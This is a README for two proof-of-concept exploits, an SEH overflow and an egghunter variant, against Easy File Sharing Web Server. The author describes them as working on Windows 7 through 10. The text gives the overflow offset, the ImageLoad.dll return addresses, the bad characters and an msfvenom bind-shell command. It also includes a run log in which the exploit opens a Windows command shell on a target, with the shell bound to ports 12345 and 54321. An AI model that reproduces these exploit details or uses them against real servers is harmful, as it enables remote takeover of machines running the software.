# Easy File Sharing Web Server POC's
Here are two poc's that will exploit this application. One is a regular SEH overflow, and the other utilizes the use of an egghunter

    dev@ubuntu:~# python EasyFilePOC_EGG.py 192.168.126.142
    [+] Trying to exploit 192.168.126.142...
    [+] Sending payload...
    [+] Trying to connect to target...
    
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
    
    C:\Users\IEUser\Desktop>

The beauty of this is that both of these work across Windows platforms.  
What does that mean??  
It means that it is tested and works on Windows 7, Windows 8, Windows 8.1, Windows 10 

# SEH Exploit

This is a regular SEH overflow that gets exploited after throwing 4061 bytes  
It uses the ImageLoad.dll address of: 0x100228ff
The shell comes out to a size of 375 bytes   
The bad characters are: '\x00\x20\x25\x2b\x2f\x5c'   
msfvenom -p windows/shell_bind_tcp LPORT=12345 -n 20 -f python -a x86 --platform windows -b '\x00\x20\x25\x2b\x2f\x5c' -v shelled    

This poc will connect for you on port 12345  

# Egghunter POC    

I implemented the use of an egghunter using the tag 'hive'  
I first exploited this application through SEH, and modified it to use what I learned after taking the CTP Course by Offensive Security.  

For the P/P/R, I had used the ImageLoad.dll at address: 0x10019ce3  
0x10019ce3 : pop ebx # pop ecx # ret  |  {PAGE_EXECUTE_READ} [ImageLoad.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\EFS Software\Easy File Sharing Web Server\ImageLoad.dll)  

After that, I used a jmp to jump six bytes which then lead to my egghunter  

I had put the tag of hive in the buffer after the payload, which didn't affect anything at all  
I did find that having to go through and search for bad characters didn't apply in this case, which was awesome!   
So for future references, that's a step you don't need to take, ahhh yissssss  

After firing the exploit, it will then connect for you on port 54321

Useful notes:  
bad character will always be the nullbyte, '\x00'    
the total size of the shellcode is 375 bytes    
the NOP sled is included of 20 bytes  
the egghunter itself is 32 bytes    
